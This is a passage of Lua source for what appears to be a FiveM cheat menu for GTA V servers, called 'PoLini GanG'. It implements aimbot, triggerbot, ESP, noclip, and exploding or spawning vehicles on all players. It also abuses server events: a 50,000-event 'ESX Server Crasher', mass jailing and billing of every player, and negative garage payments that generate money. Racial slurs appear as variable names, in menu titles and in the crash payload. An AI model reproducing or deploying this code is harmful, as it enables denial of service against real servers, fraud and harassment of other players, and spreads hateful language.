                    modTurbo = IsToggleModOn(vehicle, 18),
                    modSmokeEnabled = IsToggleModOn(vehicle, 20),
                    modXenon = IsToggleModOn(vehicle, 22),
        
                    modFrontWheels = GetVehicleMod(vehicle, 23),
                    modBackWheels = GetVehicleMod(vehicle, 24),
        
                    modPlateHolder = GetVehicleMod(vehicle, 25),
                    modVanityPlate = GetVehicleMod(vehicle, 26),
                    modTrimA = GetVehicleMod(vehicle, 27),
                    modOrnaments = GetVehicleMod(vehicle, 28),
                    modDashboard = GetVehicleMod(vehicle, 29),
                    modDial = GetVehicleMod(vehicle, 30),
                    modDoorSpeaker = GetVehicleMod(vehicle, 31),
                    modSeats = GetVehicleMod(vehicle, 32),
                    modSteeringWheel = GetVehicleMod(vehicle, 33),
                    modShifterLeavers = GetVehicleMod(vehicle, 34),
                    modAPlate = GetVehicleMod(vehicle, 35),
                    modSpeakers = GetVehicleMod(vehicle, 36),
                    modTrunk = GetVehicleMod(vehicle, 37),
                    modHydrolic = GetVehicleMod(vehicle, 38),
                    modEngineBlock = GetVehicleMod(vehicle, 39),
                    modAirFilter = GetVehicleMod(vehicle, 40),
                    modStruts = GetVehicleMod(vehicle, 41),
                    modArchCover = GetVehicleMod(vehicle, 42),
                    modAerials = GetVehicleMod(vehicle, 43),
                    modTrimB = GetVehicleMod(vehicle, 44),
                    modTank = GetVehicleMod(vehicle, 45),
                    modWindows = GetVehicleMod(vehicle, 46),
                    modLivery = GetVehicleLivery(vehicle)
                }
            end

            if blowall then
                for i = 0, 128 do
                    local ped = GetPlayerPed(i)
                    local coords = GetEntityCoords(ped)
                    AddExplosion(coords.x, coords.y, coords.z, 4, 100.0, false, true, 0.0, false)
                end
            end

            if sall then
                for i = 0, 128 do
                    local ped = GetPlayerPed(i)
                    local coords = GetEntityCoords(ped)
                    local vehiclehash = GetHashKey("savage")
                    RequestModel(vehiclehash)
                    CreateVehicle(vehiclehash, coords.x, coords.y, coords.z, GetEntityHeading(ped), 1, 0)
                end
            end

            if IsPedInAnyVehicle(PlayerPedId()) then	
                if driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 5.0)
                elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 10.0)
                end
                
            
                if superGrip then				
                    SetVehicleGravityAmount(niggerVehicle, 20.0)
                elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 10.0)			
                end

                if enchancedGrip then
                    SetVehicleGravityAmount(niggerVehicle, 12.0)
                elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 10.0)
                end

                if fdMode then	
                    SetVehicleGravityAmount(niggerVehicle, 5.5)
                    SetVehicleEngineTorqueMultiplier(niggerVehicle, 4.0)
                elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 10.0)
                    SetVehicleEngineTorqueMultiplier(niggerVehicle, 1.0)
                end

                if t2x then 
                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),2.0)
                end
                
                if t4x then 
                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),4.0)
                end

                if t8x then 
                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),8.0)
                end

                if t16x then 
                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),16.0)
                end
            end
            
            if Noclip then
                local noclip_speed = 1.0
                local ped = GetPlayerPed(-1)
                local x,y,z = getPosition()
                local dx,dy,dz = getCamDirection()
                local speed = noclip_speed
                SetEntityVisible(GetPlayerPed(-1), false, false)
                SetEntityInvincible(GetPlayerPed(-1), true)
                SetEntityVisible(ped, false);
                SetEntityVelocity(ped, 0.0001, 0.0001, 0.0001)
                if IsControlPressed(0, 21) then
                    speed = speed + 3
                end
                if IsControlPressed(0, 19) then
                    speed = speed - 0.5
                end
                if IsControlPressed(0,32) then
                    x = x+speed*dx
                    y = y+speed*dy
                    z = z+speed*dz
                end
                SetEntityCoordsNoOffset(ped,x,y,z,true,true,true)
            else
                SetEntityVisible(GetPlayerPed(-1), true, false)
                SetEntityInvincible(GetPlayerPed(-1), false)
            end

            if DeleteGun then
                local gotEntity = getEntity(PlayerId())
                if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
                    drawNotification("¡Apunte el arma a una entidad y dispare!")
                    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999, false, true)
                    SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999)
                    if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_PISTOL")) then
                        if IsPlayerFreeAiming(PlayerId()) then
                            if IsEntityAPed(gotEntity) then
                                if IsPedInAnyVehicle(gotEntity, true) then
                                    if IsControlJustReleased(1, 142) then
                                        SetEntityAsMissionEntity(GetVehiclePedIsIn(gotEntity, true), 1, 1)
                                        DeleteEntity(GetVehiclePedIsIn(gotEntity, true))
                                        SetEntityAsMissionEntity(gotEntity, 1, 1)
                                        DeleteEntity(gotEntity)
                                        drawNotification("~g~Eliminada!")
                                    end
                                else
                                    if IsControlJustReleased(1, 142) then
                                        SetEntityAsMissionEntity(gotEntity, 1, 1)
                                        DeleteEntity(gotEntity)
                                        drawNotification("~g~Eliminada!")
                                    end
                                end
                            else
                                if IsControlJustReleased(1, 142) then
                                    SetEntityAsMissionEntity(gotEntity, 1, 1)
                                    DeleteEntity(gotEntity)
                                    drawNotification("~g~Eliminada!")
                                end
                            end
                        end
                    end
                end
            end

            if esp then
                for i = 0, 128 do
                    if i ~= PlayerId() and GetPlayerServerId(i) ~= 0 then
                        local ra = RGBRainbow(1.0)
                        local pPed = GetPlayerPed(i)
                        local cx, cy, cz = table.unpack(GetEntityCoords(PlayerPedId()))
                        local x, y, z = table.unpack(GetEntityCoords(pPed))
                        local message =
                            "~h~Name: " ..
                            GetPlayerName(i) ..
                                "\nServer ID: " ..
                                    GetPlayerServerId(i) ..
                                        "\nPlayer ID: " .. i .. "\nDist: " .. math.round(GetDistanceBetweenCoords(cx, cy, cz, x, y, z, true), 1)
                        if IsPedInAnyVehicle(pPed, true) then
                            local VehName = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(pPed))))
                            message = message .. "\nVeh: " .. VehName
                        end
                        DrawText3D(x, y, z + 1.0, message, ra.r, ra.g, ra.b)

                        LineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
                        LineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
                        LineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
                        LineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
                        LineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
                        LineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
                        LineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)

                        TLineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
                        TLineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
                        TLineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
                        TLineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
                        TLineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
                        TLineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
                        TLineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)

                        ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
                        ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
                        ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
                        ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
                        ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
                        ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
                        ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
                        ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)

                        DrawLine(
                            LineOneBegin.x,
                            LineOneBegin.y,
                            LineOneBegin.z,
                            LineOneEnd.x,
                            LineOneEnd.y,
                            LineOneEnd.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )
                        DrawLine(
                            LineTwoBegin.x,
                            LineTwoBegin.y,
                            LineTwoBegin.z,
                            LineTwoEnd.x,
                            LineTwoEnd.y,
                            LineTwoEnd.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )
                        DrawLine(
                            LineThreeBegin.x,
                            LineThreeBegin.y,
                            LineThreeBegin.z,
                            LineThreeEnd.x,
                            LineThreeEnd.y,
                            LineThreeEnd.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )
                        DrawLine(
                            LineThreeEnd.x,
                            LineThreeEnd.y,
                            LineThreeEnd.z,
                            LineFourBegin.x,
                            LineFourBegin.y,
                            LineFourBegin.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )
                        DrawLine(
                            TLineOneBegin.x,
                            TLineOneBegin.y,
                            TLineOneBegin.z,
                            TLineOneEnd.x,
                            TLineOneEnd.y,
                            TLineOneEnd.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )
                        DrawLine(
                            TLineTwoBegin.x,
                            TLineTwoBegin.y,
                            TLineTwoBegin.z,
                            TLineTwoEnd.x,
                            TLineTwoEnd.y,
                            TLineTwoEnd.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )
                        DrawLine(
                            TLineThreeBegin.x,
                            TLineThreeBegin.y,
                            TLineThreeBegin.z,
                            TLineThreeEnd.x,
                            TLineThreeEnd.y,
                            TLineThreeEnd.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )
                        DrawLine(
                            TLineThreeEnd.x,
                            TLineThreeEnd.y,
                            TLineThreeEnd.z,
                            TLineFourBegin.x,
                            TLineFourBegin.y,
                            TLineFourBegin.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )
                        DrawLine(
                            ConnectorOneBegin.x,
                            ConnectorOneBegin.y,
                            ConnectorOneBegin.z,
                            ConnectorOneEnd.x,
                            ConnectorOneEnd.y,
                            ConnectorOneEnd.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )
                        DrawLine(
                            ConnectorTwoBegin.x,
                            ConnectorTwoBegin.y,
                            ConnectorTwoBegin.z,
                            ConnectorTwoEnd.x,
                            ConnectorTwoEnd.y,
                            ConnectorTwoEnd.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )
                        DrawLine(
                            ConnectorThreeBegin.x,
                            ConnectorThreeBegin.y,
                            ConnectorThreeBegin.z,
                            ConnectorThreeEnd.x,
                            ConnectorThreeEnd.y,
                            ConnectorThreeEnd.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )
                        DrawLine(
                            ConnectorFourBegin.x,
                            ConnectorFourBegin.y,
                            ConnectorFourBegin.z,
                            ConnectorFourEnd.x,
                            ConnectorFourEnd.y,
                            ConnectorFourEnd.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )

                        DrawLine(cx, cy, cz, x, y, z, ra.r, ra.g, ra.b, 255)
                    end
                end
            end

            if rainbowTint then
                for i = 0, #allWeapons do 
                    if HasPedGotWeapon(PlayerPedId(), GetHashKey(allWeapons[i])) then
                        SetPedWeaponTintIndex(PlayerPedId(), GetHashKey(allWeapons[i]), math.random(0, 7))
                    end
                end
            end

            if showCoords then 
                kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXBfISndxkHbIUAdmpVnQHstshQdqELCNkcesVCDvoiVxmVwprvl,ammSjUXRjXNvlMInQTHlXzwzWoPngUdPOsHEjyNDnRVdonAJPmspFw = table.unpack(GetEntityCoords(GetPlayerPed(-1),true))
                roundx=tonumber(string.format("%.2f",kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc))
                roundy=tonumber(string.format("%.2f",riNXBfISndxkHbIUAdmpVnQHstshQdqELCNkcesVCDvoiVxmVwprvl))
                roundz=tonumber(string.format("%.2f",ammSjUXRjXNvlMInQTHlXzwzWoPngUdPOsHEjyNDnRVdonAJPmspFw))
                bf("~r~X:~s~ "..roundx,0.05,0.00)
                bf("~r~Y:~s~ "..roundy,0.11,0.00)
                bf("~r~Z:~s~ "..roundz,0.17,0.00)
            end

            if bulletGun then
                local startDistance = GetDistance(GetGameplayCamCoord(), GetEntityCoords(PlayerPedId(), true))
                local endDistance = GetDistance(GetGameplayCamCoord(), GetEntityCoords(PlayerPedId(), true))
                startDistance = startDistance + 0.25
                endDistance = endDistance + 1000.0

                if IsPedOnFoot(PlayerPedId()) and IsPedShooting(PlayerPedId()) then
                    local bullet = GetHashKey(bullets[selectedBullet])
                    if not HasWeaponAssetLoaded(bullet) then
                        RequestWeaponAsset(bullet, 31, false)
                        while not HasWeaponAssetLoaded(bullet) do
                            Citizen.Wait(0)
                        end
                    end
                    ShootSingleBulletBetweenCoords(add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), startDistance)).x, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), startDistance)).y, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), startDistance)).z, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), endDistance)).x, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), endDistance)).y, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), endDistance)).z, 250, true, bullet, PlayerPedId(), true, false, -1.0)
                end

            end

            if vehicleGun then
                local heading = GetEntityHeading(PlayerPedId())
                local model = GetHashKey(vehicles[selectedVehicle])
                local rot = GetGameplayCamRot(0)
                local dir = RotToDirection(rot)
                local camPosition = GetGameplayCamCoord()
                local playerPosition = GetEntityCoords(PlayerPedId(), true)
                local spawnDistance = GetDistance(camPosition, playerPosition)
                spawnDistance = spawnDistance + 5
                local spawnPosition = add(camPosition, multiply(dir, spawnDistance))

                RequestModel(model)
                while not HasModelLoaded(model) do
                    debugPrint("Loading Model...")
                    Citizen.Wait(0)
                end

                if HasModelLoaded(model) then
                    if IsPedShooting(PlayerPedId()) then
                        if IsPedOnFoot(PlayerPedId()) then
                        local veh = CreateVehicle(model, spawnPosition.x, spawnPosition.y, spawnPosition.z, heading, true, true)
                        SetVehicleForwardSpeed(veh, 120.0)
                        SetModelAsNoLongerNeeded(model)
                        SetVehicleAsNoLongerNeeded(veh)
                        end
                    end		
                end							
            end

            if pedGun then
                local heading = GetEntityHeading(PlayerPedId())
                local rot = GetGameplayCamRot(0)
                local dir = RotToDirection(rot)
                local camPosition = GetGameplayCamCoord()
                local playerPosition = GetEntityCoords(PlayerPedId(), true)
                local spawnDistance = GetDistance(camPosition, playerPosition)
                spawnDistance = spawnDistance + 5
                local spawnPosition = add(camPosition, multiply(dir, spawnDistance))

                local model = GetHashKey(peds[selectedPed])

                RequestModel(model)
                while not HasModelLoaded(model) do
                    Citizen.Wait(0)
                end					

                if HasModelLoaded(model) then
                    if IsPedShooting(PlayerPedId()) then
                        local spawnedPed = CreatePed(26, model, spawnPosition.x, spawnPosition.y, spawnPosition.z, heading, true, true)	
                        SetEntityRecordsCollisions(spawnedPed, true)																
                        for f = 0.0, 75.0 do
                            if HasEntityCollidedWithAnything(spawnedPed) then break end
                                ApplyForceToEntity(spawnedPed, 1, dir.x * 10.0, dir.y * 10.0, dir.z * 10.0, 0.0, 0.0, 0.0, false, false, true, true, false, true)
                        end							
                    end		
                end								
            end

            if forceGun then
                local rot = GetGameplayCamRot(0)
                local dir = RotToDirection(rot)
                local heading = GetEntityHeading(PlayerPedId())
                if IsPedShooting(PlayerPedId()) then
                    local aiming, entity = GetEntityPlayerIsFreeAimingAt(PlayerId())
                    if aiming then											
                        if IsPedInAnyVehicle(entity) then
                            local veh = GetVehiclePedIsUsing(entity)
                            DeleteEntity(entity)
                            SetEntityHeading(veh, heading)
                            SetVehicleForwardSpeed(veh, 150.0)
                        else 
                            for i = 0, 10 do
                                ApplyForceToEntity(entity, 1, dir.x * 10.0, dir.y * 10.0, dir.z * 10.0, 0.0, 0.0, 0.0, false, false, true, true, false, true)
                            end						
                        end									
                    end				
                end
            end

            if explosiveAmmo then
                local impact, coords = GetPedLastWeaponImpactCoord(PlayerPedId())
                if impact then
                    AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
                end
            end

            if RainbowVeh then
                local dq = k(1.0)
                SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), dq.r, dq.g, dq.b)
                SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), dq.r, dq.g, dq.b)
            end

            if IsPedInAnyVehicle(PlayerPedId()) then
                if driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 5.0)
                elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 10.0)
                end


                if superGrip then
                    SetVehicleGravityAmount(niggerVehicle, 20.0)
                elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 10.0)
                end

                if enchancedGrip then
                    SetVehicleGravityAmount(niggerVehicle, 12.0)
                elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 10.0)
                end

                if fdMode then
                    SetVehicleGravityAmount(niggerVehicle, 5.5)
                    SetVehicleEngineTorqueMultiplier(niggerVehicle, 4.0)
                elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 10.0)
                    SetVehicleEngineTorqueMultiplier(niggerVehicle, 1.0)
                end
            end

            if VehSpeed and IsPedInAnyVehicle(PlayerPedId(-1), true) then
                if IsControlPressed(0, 209) then
                    SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 100.0)
                elseif IsControlPressed(0, 210) then
                    SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 0.0)
                end
            end

            if VehGod and IsPedInAnyVehicle(PlayerPedId(), true) then
				SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId()), true)
			end
                                                
            if aimbot then
                for i = 0, 128 do
                    if i ~= PlayerId() then
                        if IsPlayerFreeAiming(PlayerId()) then
                            local TargetPed = GetPlayerPed(i)
                            local TargetPos = GetEntityCoords(TargetPed)
                            local Exist = DoesEntityExist(TargetPed)
                            local Dead = IsPlayerDead(TargetPed)

                            if Exist and not Dead then
                                local OnScreen, ScreenX, ScreenY = World3dToScreen2d(TargetPos.x, TargetPos.y, TargetPos.z, 0)
                                if IsEntityVisible(TargetPed) and OnScreen then
                                    if HasEntityClearLosToEntity(PlayerPedId(), TargetPed, 10000) then
                                        local TargetCoords = GetPedBoneCoords(TargetPed, 31086, 0, 0, 0)
                                        SetPedShootsAtCoord(PlayerPedId(), TargetCoords.x, TargetCoords.y, TargetCoords.z, 1)
                                    end
                                end
                            end
                        end
                    end
                end	
            end
        
            if TriggerBot then
                local Aiming, Entity = GetEntityPlayerIsFreeAimingAt(PlayerId(), Entity)
                if Aiming then
                    if IsEntityAPed(Entity) and not IsPedDeadOrDying(Entity, 0) and IsPedAPlayer(Entity) then
                        ShootPlayer(Entity)
                    end
                end
            end
        
            if fastrun then
                SetRunSprintMultiplierForPlayer(PlayerId(), 2.49)
                SetPedMoveRateOverride(GetPlayerPed(-1), 2.15)
            else
                SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
                SetPedMoveRateOverride(GetPlayerPed(-1), 1.0)
            end

            if SuperJump then
                SetSuperJumpThisFrame(PlayerId())
            end

            if Oneshot then
                SetPlayerWeaponDamageModifier(PlayerId(), 100.0)
                local gotEntity = getEntity(PlayerId())
                if IsEntityAPed(gotEntity) then
                    if IsPedInAnyVehicle(gotEntity, true) then
                        if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                            if IsControlJustReleased(1, 69) then
                                NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
                            end
                        else
                            if IsControlJustReleased(1, 142) then
                                NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
                            end
                        end
                    end
                elseif IsEntityAVehicle(gotEntity) then
                    if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                        if IsControlJustReleased(1, 69) then
                            NetworkExplodeVehicle(gotEntity, true, true, 0)
                        end
                    else
                        if IsControlJustReleased(1, 142) then
                            NetworkExplodeVehicle(gotEntity, true, true, 0)
                        end
                    end
                end
            else
                SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
            end
        end
    end)

Citizen.CreateThread(
    function()

        local currentTint = 1
        local selectedTint = 1

        Cience.CreateMenu("MainMenu", "PoLini GanG")
        Cience.SetSubTitle("MainMenu", "BIENVENIDO DE NUEVO")
        Cience.CreateSubMenu("SelfMenu", "MainMenu", "Opciones para ti")
        Cience.CreateSubMenu("MODEL", "MainMenu", "Modelo del PJ")
        Cience.CreateSubMenu("TM1", "MainMenu", "Opciones TM1")
        Cience.CreateSubMenu("TM1J", "MainMenu", "Trabajos del TM1")
        Cience.CreateSubMenu("Credits", "MainMenu", "Credits")
        Cience.CreateSubMenu("BOMO", "TM1J", "Spawn Objects")
        Cience.CreateSubMenu("TM1JXD", "TM1J", "Jobs Money")
        Cience.CreateSubMenu("OnlinePlayersMenu", "MainMenu", "Players Online: " .. #getPlayerIds())
        Cience.CreateSubMenu("WeaponMenu", "MainMenu", "Weapon Menu")
        Cience.CreateSubMenu("SingleWeaponMenu", "WeaponMenu", "Single Weapon Spawner")
        Cience.CreateSubMenu("MaliciousMenu", "MainMenu", "Malicious Hacks")
        Cience.CreateSubMenu("VRPMenu", "MainMenu", "VRP Options")
        Cience.CreateSubMenu("ESXMenu", "MainMenu", "ESX Options")
        Cience.CreateSubMenu("ESXJobMenu", "ESXMenu", "ESX Jobs")
        Cience.CreateSubMenu("ESXMoneyMenu", "ESXMenu", "ESX Money Menu")
        Cience.CreateSubMenu("ESXDrugMenu", "ESXMenu", "ESX Drugs")
        Cience.CreateSubMenu("VehMenu", "MainMenu", "Vehicle Menu")
        Cience.CreateSubMenu("VehSpawnOpt", "VehMenu", "Vehicle Spawn Options")
        Cience.CreateSubMenu("PlayerOptionsMenu", 'OnlinePlayersMenu', 'Player Options')
        Cience.CreateSubMenu("TeleportMenu", "MainMenu", "Teleport Menu")
        Cience.CreateSubMenu("NiggerCustoms", "VehMenu", "Welcome To Nigger Customs!")
        Cience.CreateSubMenu("PlayerTrollMenu", "PlayerOptionsMenu", "Troll Options")
        Cience.CreateSubMenu("PlayerESXMenu", "PlayerOptionsMenu", "ESX Options")
        Cience.CreateSubMenu("PlayerESXJobMenu", "PlayerOptionsMenu", "ESX Jobs")
        Cience.CreateSubMenu("PlayerESXTriggerMenu", "PlayerESXMenu", "ESX Triggers")
        Cience.CreateSubMenu("BulletGunMenu", "WeaponMenu", "Bullets Gun Options")
        Cience.CreateSubMenu("TrollMenu", "MainMenu", "Troll Options")
        Cience.CreateSubMenu("WeaponCustomization", "WeaponMenu", "Weapon Cusomization Options")
        Cience.CreateSubMenu("WeaponTintMenu", "WeaponCustomization", "Weapon Tints")
        Cience.CreateSubMenu("VehicleRamMenu", "PlayerTrollMenu", "Ram Vehicles Into Player")
        Cience.CreateSubMenu("ESXBossMenu", "ESXMenu", "ESX Boss")
        Cience.CreateSubMenu("SpawnPropsMenu", "PlayerTrollMenu", "Spawn Props On Player")
        Cience.CreateSubMenu("PerformanceMenu", "NiggerCustoms", "Performance Tuning")
        Cience.CreateSubMenu("SingleWepPlayer", 'PlayerOptionsMenu', 'Single Weapon Menu')
        Cience.CreateSubMenu("SettingsMenu", "MainMenu", "Settings")
        Cience.CreateSubMenu("ESXMiscMenu", "ESXMenu", "ESX Misc")
        Cience.CreateSubMenu("VehBoostMenu", "NiggerCustoms", "Vehicle Booster")

        local allMenus = { "MainMenu", "SelfMenu", "MODEL", "TM1", "TM1J", "BOMO", "TM1JXD", "OnlinePlayersMenu", "WeaponMenu", "SingleWeaponMenu", "MaliciousMenu", 
                            "ESXMenu", "ESXJobMenu", "ESXMoneyMenu", "VehMenu", "VehSpawnOpt", "PlayerOptionsMenu", 
                            "TeleportMenu", "NiggerCustoms", "PlayerTrollMenu", "PlayerESXMenu", "PlayerESXJobMenu", 
                            "PlayerESXTriggerMenu", "BulletGunMenu", "TrollMenu", "WeaponCustomization", "WeaponTintMenu",
                            "VehicleRamMenu", "ESXBossMenu", "SpawnPropsMenu", "PerformanceMenu", "SingleWepPlayer", "SettingsMenu", "VehBoostMenu",
                            "ESXMiscMenu", "ESXDrugMenu", "Credits", "VRPMenu"}


        while Enabled do
            if Cience.IsMenuOpened("MainMenu") then
                drawNotification("~h~~r~PoLini GanG ∑")
                drawNotification("~h~~r~https://discord.gg/e2WMg7m ;)")
                if Cience.MenuButton("∑Opciones para ti", "SelfMenu") then
                elseif Cience.MenuButton("∑Modelo del PJ", "MODEL") then
                elseif Cience.MenuButton("∑Opciones TM1", "TM1") then
                elseif Cience.MenuButton("∑Troll and TM1 Jobs", "TM1J") then
                elseif Cience.MenuButton("∑Teleport Menu", "TeleportMenu") then
                elseif Cience.MenuButton("∑Jugadores Online", "OnlinePlayersMenu") then
                elseif Cience.MenuButton("∑Menu de armas", "WeaponMenu") then
                elseif Cience.MenuButton("∑Menu de coches", "VehMenu") then
                elseif Cience.MenuButton("∑Cosas curiosas", "MaliciousMenu") then
                elseif Cience.MenuButton("∑Opciones TROLL", "TrollMenu") then
                elseif Cience.MenuButton("∑Opciones ESX", "ESXMenu") then
                elseif Cience.MenuButton("∑Opciones VRP", "VRPMenu") then
                elseif Cience.MenuButton("∑Ajustes", "SettingsMenu") then
                elseif Cience.MenuButton("~g~~h~Credits", "Credits") then
                elseif Cience.Button("~h~~r~Desactivar menu") then
                    Enabled = false
                end


                Cience.Display()
            elseif Cience.IsMenuOpened("VRPMenu") then
                if Cience.Button('VRP PayGarage 100$') then
                    TriggerServerEvent('lscustoms:payGarage', {costs = -100})
                elseif Cience.Button('VRP PayGarage 1000$') then
                    TriggerServerEvent('lscustoms:payGarage', {costs = -1000})
                elseif Cience.Button('VRP PayGarage 10 000$') then
                    TriggerServerEvent('lscustoms:payGarage', {costs = -10000})
                elseif Cience.Button('VRP PayGarage 100 000$') then
                    TriggerServerEvent('lscustoms:payGarage', {costs = -100000})
                elseif Cience.Button('VRP Get Driver Licence') then
                    TriggerServerEvent('dmv:success')
                elseif Cience.Button('VRP Bank Deposit') then
                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                    TriggerServerEvent('bank:deposit', amount)
                elseif Cience.Button('VRP Bank Whithdraw') then
                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                    TriggerServerEvent('bank:withdraw', amount)
                elseif Cience.Button('VRP Slot Machine') then
                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                    TriggerServerEvent('vrp_slotmachine:server:2', amount)
                end

                Cience.Display()
            elseif Cience.IsMenuOpened("SettingsMenu") then
                if Cience.ComboBox("Menu X", menuX, currentMenuX, selectedMenuX, function(currentIndex, selectedIndex)
                    currentMenuX = currentIndex
                    selectedMenuX = selectedIndex
                    for i = 1, #allMenus do
                        Cience.SetMenuX(allMenus[i], menuX[currentMenuX])
                    end
                    end) 
                    then
                elseif Cience.ComboBox("Menu Y", menuY, currentMenuY, selectedMenuY, function(currentIndex, selectedIndex)
                    currentMenuY = currentIndex
                    selectedMenuY = selectedIndex
                    for i = 1, #allMenus do
                        Cience.SetMenuY(allMenus[i], menuY[currentMenuY])
                    end
                    end)
                    then
                end


                Cience.Display()
            elseif Cience.IsMenuOpened("TrollMenu") then
                if Cience.Button("ESX Server Crasher") then
                    for i = 1, 50000 do TriggerServerEvent('esx_skin:responseSaveSkin', {niggers = 'gay'}) TriggerServerEvent('esx_skin:responseSaveSkin', 'niggers eat shit') end
                elseif Cience.Button("ESX Send All To Jail") then
                    for i = 1, 128 do
                        TriggerServerEvent("esx-qalle-jail:jailPlayer", i, 5000,"Jailed")
                           TriggerServerEvent("esx_jailer:sendToJail", i, 45*60)
                           TriggerServerEvent("esx_jail:sendToJail", i, 45*60)
                        TriggerServerEvent("js:jailuser", i, 45*60,"Jailed")
                    end
                elseif Cience.CheckBox("Spamear chat [Sin parar]", spam, function(enabled) spam = enabled end) then
                elseif Cience.Button("Multa a todos") then
                    for i = 0, 128 do
                        TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "PoLini GanG: https://discord.gg/YB6RnCm", 10000000)
                        TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "PoLini GanG: https://discord.gg/YB6RnCm", 10000000)
